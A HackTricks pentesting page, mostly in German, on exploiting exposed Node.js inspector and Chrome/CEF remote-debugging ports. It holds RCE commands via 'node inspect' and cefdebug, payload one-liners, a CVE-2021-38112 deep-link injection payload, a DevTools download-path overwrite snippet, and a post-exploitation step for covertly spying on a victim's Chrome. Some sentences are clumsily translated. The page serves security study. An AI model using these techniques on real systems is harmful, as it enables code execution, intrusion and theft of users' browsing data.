# Node inspector/CEF debug abuse

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Grundinformationen

[Aus den Dokumenten](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wenn mit dem `--inspect`-Schalter gestartet, hört ein Node.js-Prozess auf einen Debugging-Client. **Standardmäßig** hört es auf Host und Port **`127.0.0.1:9229`**. Jeder Prozess wird auch mit einer **einzigartigen** **UUID** zugewiesen.

Inspector-Clients müssen die Hostadresse, den Port und die UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Da der **Debugger vollen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein böswilliger Akteur, der in der Lage ist, eine Verbindung zu diesem Port herzustellen, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle Privilegieneskalation**).
{% endhint %}

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wenn Sie einen inspizierten Prozess starten, wird etwas wie dies erscheinen:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prozesse, die auf **CEF** (**Chromium Embedded Framework**) basieren, müssen den Parameter `--remote-debugging-port=9222` verwenden, um den **Debugger** zu öffnen (die SSRF-Schutzmaßnahmen bleiben sehr ähnlich). Sie **stattdessen** von der Gewährung einer **NodeJS** **Debug**-Sitzung kommunizieren mit dem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), dies ist eine Schnittstelle zur Steuerung des Browsers, aber es gibt kein direktes RCE.

Wenn Sie einen debugged Browser starten, wird etwas wie dies erscheinen:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets und Same-Origin-Policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet sind, können WebSocket- und HTTP-Anfragen gemäß dem Sicherheitsmodell des Browsers stellen. Eine **initiale HTTP-Verbindung** ist notwendig, um eine **einzigartige Debugger-Sitzungs-ID** zu **erhalten**. Die **Same-Origin-Policy** **verhindert**, dass Websites **diese HTTP-Verbindung** herstellen können. Zur zusätzlichen Sicherheit gegen [**DNS-Rebinding-Angriffe**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** überprüft Node.js, dass die **'Host'-Header** für die Verbindung entweder eine **IP-Adresse** oder **`localhost`** oder **`localhost6`** genau angeben.

{% hint style="info" %}
Diese **Sicherheitsmaßnahmen verhindern das Ausnutzen des Inspektors**, um Code auszuführen, indem **einfach eine HTTP-Anfrage gesendet wird** (was durch das Ausnutzen einer SSRF-Schwachstelle geschehen könnte).
{% endhint %}

### Inspektor in laufenden Prozessen starten

Sie können das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, um den **Inspektor** am Standardport **zu starten**. Beachten Sie jedoch, dass Sie über ausreichende Berechtigungen verfügen müssen, sodass dies Ihnen **privilegierten Zugriff auf Informationen innerhalb des Prozesses** gewähren kann, jedoch keine direkte Privilegieneskalation darstellt.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Dies ist nützlich in Containern, da **das Herunterfahren des Prozesses und das Starten eines neuen** mit `--inspect` **keine Option** ist, da der **Container** mit dem Prozess **getötet** wird.
{% endhint %}

### Mit dem Inspector/Debugger verbinden

Um sich mit einem **Chromium-basierten Browser** zu verbinden, können die URLs `chrome://inspect` oder `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche Konfigurieren sollte sichergestellt werden, dass der **Zielhost und der Port** korrekt aufgeführt sind. Das Bild zeigt ein Beispiel für Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (674).png>)

Mit der **Befehlszeile** können Sie sich mit einem Debugger/Inspector verbinden mit:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, **Inspektoren** zu finden, die lokal ausgeführt werden, und **Code** in sie zu **injizieren**.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Beachten Sie, dass **NodeJS RCE-Exploits nicht funktionieren**, wenn Sie über [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) mit einem Browser verbunden sind (Sie müssen die API überprüfen, um interessante Dinge damit zu tun).
{% endhint %}

## RCE im NodeJS Debugger/Inspektor

{% hint style="info" %}
Wenn Sie hierher gekommen sind, um zu erfahren, wie man [**RCE aus einem XSS in Electron erhält, überprüfen Sie bitte diese Seite.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Einige gängige Möglichkeiten, **RCE** zu erhalten, wenn Sie sich mit einem Node **Inspektor** verbinden können, sind die Verwendung von etwas wie (es scheint, dass dies **bei einer Verbindung zum Chrome DevTools-Protokoll nicht funktionieren wird**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In this section I will just list interesting things I find people have used to exploit this protocol.

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung eine benutzerdefinierte URI im System (workspaces://) registrierte, die die vollständige URI empfing und dann die auf CEF basierende Anwendung mit einer Konfiguration startete, die teilweise aus dieser URI konstruiert wurde.

Es wurde festgestellt, dass die URI-Parameter URL-dekodiert und verwendet wurden, um die CEF-Basisanwendung zu starten, was es einem Benutzer ermöglichte, das Flag **`--gpu-launcher`** in der **Befehlszeile** zu **injizieren** und beliebige Dinge auszuführen.

So, a payload like:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wird ein calc.exe ausführen.

### Dateien überschreiben

Ändern Sie den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und laden Sie eine Datei herunter, um den **Quellcode** der Anwendung, der häufig verwendet wird, mit Ihrem **bösartigen Code** zu **überschreiben**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE und Exfiltration

Laut diesem Beitrag: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) ist es möglich, RCE zu erlangen und interne Seiten von theriver zu exfiltrieren.

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs, der einen auf Chrome/Chromium basierenden Browser verwendet, könntest du einen Chrome-Prozess mit **aktiviertem Debugging und Port-Forwarding des Debugging-Ports** starten, um darauf zugreifen zu können. Auf diese Weise wirst du in der Lage sein, **alles zu inspizieren, was das Opfer mit Chrome macht, und sensible Informationen zu stehlen**.

Der stealthy Weg ist, **jeden Chrome-Prozess zu beenden** und dann etwas wie
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referenzen

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
